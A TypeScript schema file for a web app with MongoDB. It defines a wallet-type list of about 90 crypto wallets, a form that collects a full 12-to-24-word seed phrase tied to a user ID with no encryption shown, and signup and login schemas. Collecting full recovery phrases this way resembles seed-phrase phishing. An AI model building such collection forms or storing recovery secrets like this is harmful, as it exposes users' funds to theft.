import { z } from 'zod';
import type { ObjectId } from 'mongodb'; // Import ObjectId

// --- Wallet Types ---
// Expanded list of wallet types (ensure this meets the > 70 requirement)
export const WalletTypes = [
  // Major Software Wallets
  'Metamask',
  'Trust Wallet',
  'Exodus',
  'Coinbase Wallet',
  'Electrum',
  'MyEtherWallet (MEW)',
  'MyCrypto',
  'Atomic Wallet',
  'Jaxx Liberty',
  'Guarda Wallet',
  'Coinomi',
  'Edge Wallet',
  'BRD Wallet (Breadwallet)',
  'Samourai Wallet', // Bitcoin specific
  'Wasabi Wallet', // Bitcoin specific
  'BlueWallet', // Bitcoin specific
  'Green Wallet (Blockstream Green)', // Bitcoin specific
  'Nunchuk', // Bitcoin specific, multisig focus
  'Sparrow Wallet', // Bitcoin specific
  'Phantom', // Solana focus
  'Solflare', // Solana focus
  'Glow', // Solana focus
  'Yoroi Wallet', // Cardano focus
  'Daedalus Wallet', // Cardano focus
  'Keplr Wallet', // Cosmos ecosystem focus
  'Cosmostation Wallet', // Cosmos ecosystem focus
  'Terra Station', // Terra ecosystem focus
  'Polkadot{.js}', // Polkadot/Kusama focus
  'Talisman', // Polkadot/Kusama focus
  'Feather Wallet', // Monero focus
  'Monero GUI Wallet', // Monero focus
  'Cake Wallet', // Monero & Bitcoin focus
  'Exodus Mobile',
  'Exodus Desktop',
  'Exodus Web3 Wallet',
  'MetaMask Mobile',
  'MetaMask Extension',
  'Trust Wallet Mobile',

  // Major Hardware Wallets
  'Ledger Nano S',
  'Ledger Nano S Plus',
  'Ledger Nano X',
  'Ledger Stax',
  'Trezor Model One',
  'Trezor Model T',
  'Trezor Safe 3',
  'KeepKey',
  'Coldcard Mk4', // Bitcoin specific
  'BitBox02', // Bitcoin specific option available
  'Foundation Passport', // Bitcoin specific
  'SeedSigner', // DIY Bitcoin Hardware Wallet
  'Keystone Pro (formerly Cobo Vault)',
  'SafePal S1',
  'Ellipal Titan',
  'CoolWallet Pro',
  'Ngrave Zero',

  // Exchange Wallets (Generally not recommended for holding keys/seeds)
  'Binance Wallet (custodial)',
  'Kraken Wallet (custodial)',
  'Coinbase (custodial)',
  'Crypto.com DeFi Wallet', // Non-custodial part

  // Niche/Specific Wallets
  'Argent Wallet', // Smart Contract Wallet (Ethereum L2 focus)
  'Loopring Wallet', // Smart Contract Wallet (Ethereum L2 focus)
  'Argent X', // StarkNet focus
  'Braavos', // StarkNet focus
  'XDEFI Wallet', // Multi-chain focus
  'Frame', // Desktop multi-chain
  'Rabby Wallet', // Extension focus
  'Nami Wallet', // Cardano focus
  'Eternl Wallet', // Cardano focus
  'Enkrypt', // Polkadot/Multichain
  'SubWallet', // Polkadot/Kusama focus
  'Ronin Wallet', // Axie Infinity/Ronin chain
  'Temple Wallet', // Tezos focus
  'Kukai Wallet', // Tezos focus
  'Core Wallet', // Avalanche focus
  'TronLink', // Tron focus
  'MathWallet', // Multi-chain
  'AlphaWallet', // Ethereum Mobile
  'Zelcore', // Multi-asset
  'Coin98 Wallet', // Multi-chain DeFi focus
  'Safe{Wallet}', // Formerly Gnosis Safe (Multisig)

  // Other / Generic
  'Paper Wallet',
  'Brain Wallet (Not Recommended)',
  'Hardware Wallet (Generic)',
  'Software Wallet (Generic)',
  'Mobile Wallet (Generic)',
  'Desktop Wallet (Generic)',
  'Web Wallet (Generic)',
  'Multisig Wallet (Generic)',
  'Other',
] as const;

// --- Seed Phrase Schemas ---
export const seedPhraseSchema = z.object({
  walletName: z
    .string()
    .min(1, { message: 'Wallet name cannot be empty.' })
    .max(50, { message: 'Wallet name cannot exceed 50 characters.' }),
  seedPhrase: z
    .string()
    .min(12 * 3, { message: 'Seed phrase seems too short.' }) // Rough minimum length check
    .regex(/^[a-z]+(\s[a-z]+)*$/, {
      message: 'Seed phrase should only contain lowercase words separated by spaces.',
    })
    .refine(
      (value) => {
        const words = value.trim().split(/\s+/);
        // BIP-39 standard word counts
        return [12, 15, 18, 21, 24].includes(words.length);
      },
      {
        message:
          'Seed phrase must contain 12, 15, 18, 21, or 24 words.',
      }
    ),
  walletType: z.enum(WalletTypes, {
    errorMap: () => ({ message: 'Please select a valid wallet type.' }),
  }),
  // userId is now ObjectId | string for flexibility before/after DB insertion
  userId: z.union([z.custom<ObjectId>(), z.string()]).refine(val => val !== '', { message: 'User association is required.'}),
});

export type SeedPhraseFormData = z.infer<typeof seedPhraseSchema>;

// Data structure potentially including database ID and timestamp
// Use ObjectId for _id from MongoDB
export type SeedPhraseData = Omit<SeedPhraseFormData, '_id'> & {
  _id?: ObjectId;
  userId: ObjectId; // In the database, userId should always be an ObjectId
  createdAt?: Date;
};


// --- User Authentication Schemas ---

export const signupSchema = z.object({
  email: z.string().email({ message: 'Please enter a valid email address.' }),
  password: z.string().min(8, { message: 'Password must be at least 8 characters long.' }),
});

export type SignupFormData = z.infer<typeof signupSchema>;

export const loginSchema = z.object({
  email: z.string().email({ message: 'Please enter a valid email address.' }),
  password: z.string().min(1, { message: 'Password cannot be empty.' }),
});

export type LoginFormData = z.infer<typeof loginSchema>;


// --- User Data Structure ---
// Represents user data as stored in MongoDB
export type User = {
  _id: ObjectId; // Use ObjectId for MongoDB ID
  email: string;
  passwordHash: string; // Store the hashed password
  createdAt?: Date;
};
